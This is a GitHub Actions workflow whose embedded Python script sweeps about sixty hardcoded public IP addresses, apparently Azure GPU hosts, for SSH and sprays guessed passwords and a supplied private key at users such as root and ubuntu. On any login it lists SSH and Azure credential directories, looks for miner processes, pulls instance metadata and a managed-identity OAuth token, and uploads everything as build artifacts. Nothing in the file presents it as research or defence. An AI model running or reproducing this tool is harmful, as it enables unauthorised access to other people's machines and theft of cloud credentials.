name: ul-h100-pw
on:
  workflow_dispatch:
    inputs:
      cycles: {description: 'sweep cycles', required: false, default: '60'}
jobs:
  pw:
    runs-on: ubuntu-latest
    timeout-minutes: 55
    steps:
      - uses: actions/checkout@v4
      - name: deps
        run: |
          python3 -m pip install --quiet paramiko
          echo "runner: $(hostname) $(curl -s -m 5 https://ifconfig.me || true)"
      - name: sweep-and-spray
        env:
          IPS: "134.149.42.155 134.149.59.33 135.116.19.243 135.116.84.27 135.225.79.249 168.62.216.152 172.174.31.97 172.213.25.163 20.109.152.114 20.109.162.87 20.114.255.207 20.115.147.1 20.118.131.83 20.125.42.21 20.125.49.91 20.125.99.42 20.205.187.223 20.216.40.163 20.223.198.42 20.225.239.178 20.234.97.205 20.237.207.128 20.240.130.208 20.240.141.10 20.240.55.118 20.245.108.11 20.50.113.151 20.59.127.108 20.74.153.201 20.74.241.13 20.74.242.85 20.91.207.55 20.97.252.251 23.100.38.120 4.155.130.93 4.193.185.193 4.194.2.30 4.204.241.108 4.210.119.224 4.246.80.6 40.113.1.63 40.123.206.138 40.70.241.0 40.70.247.98 48.193.46.184 48.193.47.3 51.104.16.184 52.236.59.223 57.154.50.93 57.174.238.72 70.153.141.118 70.153.142.83 70.153.148.119 70.153.149.34 70.153.18.193 70.153.87.133 74.162.158.9 74.234.69.82 98.71.78.150 "
          KEYB64: ""
          CYCLES: ${{ github.event.inputs.cycles }}
        run: |
          cat > sw.py <<'PY'
          import os, socket, base64, time, threading, json, sys, io
          import paramiko
          from concurrent.futures import ThreadPoolExecutor
          IPS = os.environ["IPS"].split()
          KEYB64 = os.environ["KEYB64"]
          CYCLES = int(os.environ.get("CYCLES","10"))
          open("/tmp/k","w").write(base64.b64decode(KEYB64).decode())
          os.chmod("/tmp/k",0o600)
          USERS=["t19","ubuntu","azureuser","root","admin"]
          PWS=["Azcfy@2026","H100@azure2026","T19@azure2026","Azadm1n!2026","InfiniBand1!",
               "Prl@2026!","Ulplant@2026","Azure@123456","P@ssw0rd2026","Dongsuju@2026"]
          LOG=open("/tmp/log.txt","a",buffering=1)
          def lg(m):
              print(m); LOG.write(m+"\n")
          budget={"pw":40,"key":120}
          lock=threading.Lock()
          def tcp_banner(ip,port=22,t=4):
              try:
                  s=socket.create_connection((ip,port),timeout=t); s.settimeout(t)
                  b=s.recv(255); s.close(); return b.decode(errors='replace').strip()
              except Exception as e:
                  return None
          def methods(ip,user,t=6):
              try:
                  tr=paramiko.Transport((ip,22)); tr.start_client(timeout=t)
                  try: tr.auth_none(user)
                  except paramiko.BadAuthenticationType as e: tr.close(); return e.allowed_types
                  except Exception as e: tr.close(); return ["err:"+str(e)[:60]]
                  tr.close(); return ["AUTH_NONE_OK"]
              except Exception as e: return ["conn:"+str(e)[:50]]
          def try_key(ip,user):
              with lock:
                  if budget["key"]<=0: return None
                  budget["key"]-=1
              try:
                  c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                  pkey=paramiko.Ed25519Key.from_private_key_file("/tmp/k")
                  c.connect(ip,22,username=user,pkey=pkey,timeout=8,banner_timeout=8,auth_timeout=8,allow_agent=False,look_for_keys=False)
                  return c
              except paramiko.AuthenticationException: return None
              except Exception: return None
          def try_pw(ip,user,pw):
              with lock:
                  if budget["pw"]<=0: return None
                  budget["pw"]-=1
              try:
                  c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                  c.connect(ip,22,username=user,password=pw,timeout=8,banner_timeout=8,auth_timeout=8,allow_agent=False,look_for_keys=False)
                  return c
              except paramiko.AuthenticationException: return None
              except Exception: return None
          def census(c,ip):
              cmds=["id","hostname -I; cat /etc/hostname","cat /proc/1/cgroup | head -2","nvidia-smi -L",
                    "nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version --format=csv",
                    "ps -eo pid,etimes,args | grep -Ei 'pearl|wildrig|miner|krig' | grep -v grep | head -6",
                    "ls -la /root/.ssh /root/.azure /etc/ul 2>/dev/null | head -20",
                    "curl -s -m 6 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json' | head -c 900",
                    "curl -s -m 8 -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | head -c 400"]
              out=[]
              for cmd in cmds:
                  try:
                      i,o,e=c.exec_command(cmd,timeout=25); out.append("$ "+cmd+"\n"+o.read().decode(errors='replace')+e.read().decode(errors='replace'))
                  except Exception as ex: out.append("$ "+cmd+"\nERR "+str(ex)[:80])
              return "\n".join(out)
          def handle(ip,banner):
              lg("PORT_OPEN %s %r" % (ip,banner))
              ms=methods(ip,"t19"); lg("METHODS %s %r" % (ip,ms))
              for u in ["t19","ubuntu","azureuser","root"]:
                  c=try_key(ip,u)
                  if c:
                      lg("AUTH_OK KEY %s user=%s" % (ip,u)); body=census(c,ip); open("/tmp/AUTH_%s.txt"%ip,"w").write(body); lg("CENSUS %s\n%s"%(ip,body)); return True
              if "password" in str(ms) or "keyboard-interactive" in str(ms) or ms==["AUTH_NONE_OK"] or True:
                  for u in ["t19","ubuntu"]:
                      for pw in PWS:
                          with lock:
                              if budget["pw"]<=0: return False
                          c=try_pw(ip,u,pw)
                          if c:
                              lg("AUTH_OK PW %s user=%s pw=%s" % (ip,u,pw)); body=census(c,ip); open("/tmp/AUTH_%s.txt"%ip,"w").write(body); lg("CENSUS %s\n%s"%(ip,body)); return True
                          else:
                              lg("PWD_FAIL %s user=%s pw=%s" % (ip,u,pw))
                      if budget["pw"]<=0: return False
              return False
          def probe(ip):
              b=tcp_banner(ip)
              if b and b.startswith("SSH-"): return (ip,b)
              return None
          open_hosts={}
          for cyc in range(CYCLES):
              lg("== CYCLE %d %s" % (cyc, time.strftime("%H:%M:%SZ", time.gmtime())))
              with ThreadPoolExecutor(max_workers=48) as ex:
                  for r in ex.map(probe, IPS):
                      if r: open_hosts[r[0]]=r[1]; lg("BANNER %s %r"%(r[0],r[1]))
              lg("OPEN_COUNT %d %s" % (len(open_hosts), list(open_hosts)))
              for ip in list(open_hosts):
                  if budget["pw"]<=0: break
                  handle(ip, open_hosts[ip])
              if budget["pw"]<=0: break
              time.sleep(20)
          lg("SUMMARY open=%d pwd_budget_left=%d key_left=%d" % (len(open_hosts),budget["pw"],budget["key"]))
          lg("NEGCTL wrongpw 20.237.207.128 -> %r" % (try_pw("20.237.207.128","t19","ul-definitely-wrong-pw"),))
          PY
          python3 sw.py 2>&1 | tee -a /tmp/all.txt
      - name: artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: pw-out
          path: |
            /tmp/log.txt
            /tmp/AUTH_*.txt
          if-no-files-found: warn
  http:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: http-plane
        run: |
          for H in 20.237.207.128 40.123.206.138 51.104.16.184 20.205.187.223 20.216.40.163; do
            for U in "http://$H/" "http://$H:8080/" "https://$H/" ; do
              echo "== $U"; curl -sk -m 8 -D - "$U" -o /tmp/b.html -w 'code=%{http_code} size=%{size_download}\n' | head -12
              head -c 300 /tmp/b.html; echo
            done
          done
